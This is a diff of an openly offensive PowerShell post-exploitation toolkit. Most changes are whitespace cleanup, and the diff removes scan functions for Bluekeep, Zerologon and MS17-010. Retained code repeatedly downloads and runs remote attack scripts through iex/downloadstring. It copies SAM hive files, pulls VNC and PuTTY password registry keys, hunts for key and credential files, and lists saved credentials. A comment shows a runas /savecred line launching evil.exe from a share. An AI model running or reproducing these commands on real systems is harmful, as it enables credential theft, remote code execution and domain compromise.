@@ -1,5 +1,4 @@
 
-   
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); 
             if(!$consoleoutput){Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" >> "C:\sh_adm_mtrx\seatbelt\seatbelt.txt"}else{Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" }
  
@@ -128,7 +127,6 @@ function SessionGopher
     }
 }
 
-
 function Kittielocal 
 {
     param(
@@ -228,10 +226,7 @@ function Localreconmodules
             
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    @'
-
-
-'@
+    
     if ($noninteractive -and (!$consoleoutput))
     {
         generalrecon -noninteractive
@@ -283,16 +278,8 @@ function Generalrecon{
     $noninteractive   
 )
     if(!$consoleoutput){pathcheck}
-    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-
-    
-    
-    
-    
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName 
     if(!$consoleoutput)
-  
-    
-
     #Collecting usefull Informations
     if(!$consoleoutput){
         Write-Host -ForegroundColor Yellow 'Collecting local system Informations for later lookup, saving them to .\LocalRecon\'
@@ -325,10 +312,7 @@ function Generalrecon{
 	}
     else
     {
- 
-    
-	    if(!$consoleoutput){Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096 >> "$currentPath\LocalRecon\Firewall_Rules.txt"}else{Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096} 
-	    
+	    if(!$consoleoutput){Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096 >> "$currentPath\LocalRecon\Firewall_Rules.txt"}else{Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096}
 	    $output = " Files with Full Control and Modify Access`r`n"
 	    $output = $output +  "-----------------------------------------------------------`r`n"
     	    $files = get-childitem C:\
@@ -358,35 +342,27 @@ function Generalrecon{
 	    
 	 Write-Host -ForegroundColor Yellow '-------> Checking for potential sensitive user files'
 	 if(!$consoleoutput){get-childitem "C:\Users\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string >> "$currentPath\LocalRecon\Potential_Sensitive_User_Files.txt"}else{get-childitem "C:\Users\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string} 
-	 
-	 
-     
      }
-     if (($HKCU | test-path) -eq "True") 
+         if (($HKCU | test-path) -eq "True") 
      {
          if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
          {
         		if(!$consoleoutput){echo "AlwaysInstallElevated enabled on this host!" >> "$currentPath\Vulnerabilities\AlwaysInstallElevatedactive.txt"}else{Write-Host -ForegroundColor Red "AlwaysInstallElevated enabled on this host!"}
          }
      }
-	 
 	 Write-Host -ForegroundColor Yellow '-------> Checking if IPv6 is active (mitm6 attacks)'
 	 $IPV6 = $false
 	 $arrInterfaces = (Get-WmiObject -class Win32_NetworkAdapterConfiguration -filter "ipenabled = TRUE").IPAddress
 	 foreach ($i in $arrInterfaces) {$IPV6 = $IPV6 -or $i.contains(":")}
-	 if(!$consoleoutput){if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo "IPv6 enabled, check all interfaces for the specific NIC" >> "$currentPath\Vulnerabilities\IPv6_Enabled.txt" }}else{if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo "IPv6 enabled, check all interfaces for the specific NIC"}}
-	 
+	 if(!$consoleoutput){if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo "IPv6 enabled, check all interfaces for the specific NIC" >> "$currentPath\Vulnerabilities\IPv6_Enabled.txt" }}else{if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo "IPv6 enabled, check all interfaces for the specific NIC"}
 	 Write-Host -ForegroundColor Yellow '-------> Collecting installed Software informations'
 	 if(!$consoleoutput){Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096 >> "$currentPath\LocalRecon\InstalledSoftwareAll.txt"}else{Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096}
-         
 	 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Vulmap.ps1')
 	 Write-Host -ForegroundColor Yellow '-------> Checking if Software is outdated and therefore vulnerable / exploitable'
-	 if(!$consoleoutput){Invoke-Vulmap | out-string -Width 4096 >> "$currentPath\Vulnerabilities\VulnerableSoftware.txt"}else{Invoke-Vulmap | out-string -Width 4096}
-        
-            
-     # Collecting more information
-     Write-Host -ForegroundColor Yellow '-------> Checking for accesible SAM/SYS Files'
-     if(!$consoleoutput){
+	 if(!$consoleoutput){Invoke-Vulmap | out-string -Width 4096 >> "$currentPath\Vulnerabilities\VulnerableSoftware.txt"}else{Invoke-Vulmap | out-string -Width 4096} 
+      # Collecting more information
+        Write-Host -ForegroundColor Yellow '-------> Checking for accesible SAM/SYS Files'
+        if(!$consoleoutput){
         If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"}            
         If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\Vulnerabilities\SAM"}
         If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\Vulnerabilities\SAM"}
@@ -422,7 +398,6 @@ function Generalrecon{
 	 {
 	  if(!$consoleoutput){reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"}else{reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"}
 	 }
-     
      if(!$consoleoutput){
      If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> "$currentPath\LocalRecon\SNMPParameters.txt"}
      If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$currentPath\Vulnerabilities\PuttySessions.txt"}
@@ -441,21 +416,19 @@ function Generalrecon{
         If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"}
         If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password"}
         If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password}
-
         If (Test-Path -Path C:\unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\unattend.xml, check it for passwords'}
         If (Test-Path -Path C:\Windows\Panther\Unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\Windows\Panther\Unattend.xml, check it for passwords'}
         If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\Windows\Panther\Unattend\Unattend.xml, check it for passwords'}
         If (Test-Path -Path C:\Windows\system32\sysprep.inf){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at C:\Windows\system32\sysprep.inf, check it for passwords'}
         If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at C:\Windows\system32\sysprep\sysprep.xml, check it for passwords'}
      }
-     
-     if(!$consoleoutput){Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> "$currentPath\Vulnerabilities\webconfigfiles.txt"}else{Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue}
+        if(!$consoleoutput){Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> "$currentPath\Vulnerabilities\webconfigfiles.txt"}else{Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue}
 	    
-	 Write-Host -ForegroundColor Yellow '-------> List running tasks'
-     if(!$consoleoutput){Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize >> "$currentPath\LocalRecon\RunningTasks.txt"}else{Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize}
+        Write-Host -ForegroundColor Yellow '-------> List running tasks'
+        if(!$consoleoutput){Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize >> "$currentPath\LocalRecon\RunningTasks.txt"}else{Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize}
 
-     Write-Host -ForegroundColor Yellow '-------> Checking for usable credentials (cmdkey /list)'
-     if(!$consoleoutput){cmdkey /list >> "$currentPath\Vulnerabilities\SavedCredentials.txt"}else{cmdkey /list} # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+        Write-Host -ForegroundColor Yellow '-------> Checking for usable credentials (cmdkey /list)'
+        if(!$consoleoutput){cmdkey /list >> "$currentPath\Vulnerabilities\SavedCredentials.txt"}else{cmdkey /list} # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 }
 
 function Morerecon{
@@ -656,209 +629,6 @@ function reconAD
     cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
 }
 
-function Bluekeep
-{
-<#
-        .DESCRIPTION
-        Search AD for pingable Windows servers and Check if they are vulnerable to bluekeep. Original script by https://github.com/vletoux @Pingcastle
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
-    #>
-    #Domain Recon / Lateral Movement / Exploitation Phase
-    [CmdletBinding()]
-    Param (
-        [Switch]
-        $noninteractive,
-        [Switch]
-        $consoleoutput   
-    )
-
-    if(!$consoleoutput){pathcheck}
-    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-
-    IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/bluekeepscan.ps1')
-    IEX ($viewdevobfs)
-    $serversystems = "yes"
-    if (!$noninteractive){$serversystems = Read-Host -Prompt 'Start Bluekeep Scan for Windows Servers only (alternatively we can scan all Windows 7 Clients)? (yes/no)'}
-    if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
-    {
-	    if(Test-Path -Path "$currentPath\DomainRecon\Windows_Servers.txt")
-        {
-              Write-Host -ForegroundColor Yellow "Found an existing Server list, using this one instead of generating a new one!"
-             $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Servers.txt"
-        }
-        else
-        {
-            Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
-	        $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
-            $ActiveServers = $ActiveServers.dnshostname
-            if(!$consoleoutput){$ActiveServers >> "$currentPath\DomainRecon\Windows_Servers.txt"}
-        }
-	    foreach ($acserver in $ActiveServers)
-        {
-		try{
-         	if (bluekeepscan -target $acserver)
-                {
-                	Write-Host -ForegroundColor Yellow 'Found vulnerable Server, putting it to .\VUlnerabilities\bluekeep_VulnerableServers.txt!'
-                    if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\bluekeep_VulnerableServers.txt"}else{Write-Host -ForegroundColor red "$acserver is vulnerable"}
-                }
-		}catch{Write-Host "Got an error"}
-        }
-    }
-    else
-    {
-       	if(Test-Path -Path "$currentPath\DomainRecon\Windows_Systems.txt")
-        {
-            Write-Host -ForegroundColor Yellow "Found an existing Windows system list, using this one instead of generating a new one!"
-            $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Systems.txt"
-        }
-        else
-        {
-            Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
-	        $ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
-            $ActiveServers = $ActiveServers.dnshostname
-            if(!$consoleoutput){$ActiveServers >> "$currentPath\DomainRecon\Windows_Systems.txt"}
-        }
-	    foreach ($acserver in $ActiveServers)
-            {
-		    try{
-         	    if (bluekeepscan -target $acserver)
-                    {
-                	    Write-Host -ForegroundColor Yellow "Found vulnerable System - $acserver. Just Pwn it!"
-                        if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\bluekeep_VulnerableSystems.txt"}else{Write-Host -ForegroundColor Red "$acserver is vulnerable"}
-                    }
-		    }catch{Write-Host "Got an error"}
-        }
-    }
-
-}
-
-function zerologon
-{
-<#
-        .DESCRIPTION
-        Search in AD for Zerologon vulnerable DCs
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
-    #>
-    #
-    [CmdletBinding()]
-    Param (
-        [Switch]
-        $noninteractive,
-        [Switch]
-        $consoleoutput   
-    )
-    if(!$consoleoutput){pathcheck}
-    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    IEX ($viewdevobfs)         
-	Write-Host -ForegroundColor Yellow 'Searching for zerologon vulnerable Domain Controllers - if vulnerable you can pwn everything in 5 minutes.' 
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Zerologon.ps1')
-    $domcontrols = spinster
-        
-        
-    foreach ($domc in $domcontrols.name)
-    {
-        if(!$consoleoutput){$domc > "$currentPath\DomainRecon\DC-FQDN.txt"}
-	 	try{
-
-
-                $Results = Invoke-Zerologon -fqdn $domc
-
-                if (!($Results -eq $null))
-                {
-                    Write-Host "Found vulnerable DC: " 
-                    $domc
-                    if(!$consoleoutput){$domc >> "$currentPath\Vulnerabilities\ZerologonvulnerableDC.txt"}
-
-                }
-	       }
-           catch
-           {
-                Write-Host "Got an error"
-           }
-    }
-
-}
-
-function MS17-10
-{
-<#
-        .DESCRIPTION
-        Search in AD for pingable Windows servers and Check if they are vulnerable to MS17-10. Original script by https://github.com/vletoux @PingCastle
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
-    #>
-    #Domain Recon / Lateral Movement / Exploitation Phase
-    [CmdletBinding()]
-    Param (
-        [Switch]
-        $noninteractive,
-        [Switch]
-        $consoleoutput   
-    )
-    if(!$consoleoutput){pathcheck}
-    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-
-    IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ms17-10.ps1')
-    IEX ($viewdevobfs)
-    $serversystems = "yes"
-    if(!$noninteractive)
-    {
-        $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
-    }
-    if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
-    {
-	    if(Test-Path -Path "$currentPath\DomainRecon\Windows_Servers.txt")
-        {
-            Write-Host -ForegroundColor Yellow "Found an existing Server list, using this one instead of generating a new one!"
-            $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Servers.txt"
-        }
-        else
-        {
-            Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
-	        $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
-            $ActiveServers = $ActiveServers.dnshostname
-            if(!$consoleoutput){$ActiveServers >> "$currentPath\DomainRecon\Windows_Servers.txt"}
-        }
-	foreach ($acserver in $ActiveServers)
-        {
-		try{
-         	if (Scan-MS17-10 -target $acserver)
-                {
-                	Write-Host -ForegroundColor Yellow "Found vulnerable Server - $acserver. Just Pwn this system!"
-                    if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\MS17-10_VulnerableServers.txt"}else{Write-Host -ForegroundColor Red "$acserver is vulnerable to MS17-10!"}
-                }
-		}catch{Write-Host "Got an error"}
-        }
-    }
-    else
-    {
-       	if(Test-Path -Path "$currentPath\DomainRecon\Windows_Systems.txt")
-        {
-            Write-Host -ForegroundColor Yellow "Found an existing Windows system list, using this one instead of generating a new one!"
-            $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Systems.txt"
-        }
-        else
-        {
-            Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
-	        $ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
-            $ActiveServers = $ActiveServers.dnshostname
-            if(!$consoleoutput){$ActiveServers >> "$currentPath\DomainRecon\Windows_Systems.txt"}
-        }
-	foreach ($acserver in $ActiveServers)
-        {
-		try{
-         	if (Scan-MS17-10 -target $acserver)
-                {
-                	Write-Host -ForegroundColor Yellow 'Found vulnerable System - $acserver. Just Pwn it!'
-                    if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\MS17-10_VulnerableSystems.txt"}else{Write-Host -ForegroundColor Red "$acserver is vulnerable to MS17-10!"}
-                }
-		}catch{Write-Host "Got an error"}
-        }
-    }
-
-}
 
 function PowerSQL
 {
@@ -984,7 +754,6 @@ function oldchecks
 {
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-
     # Sherlock script, P0werUp Scipt, Get-GPP Scripts from p0werspl0it + credential manager dump
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/locksher.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/UpPower.ps1')
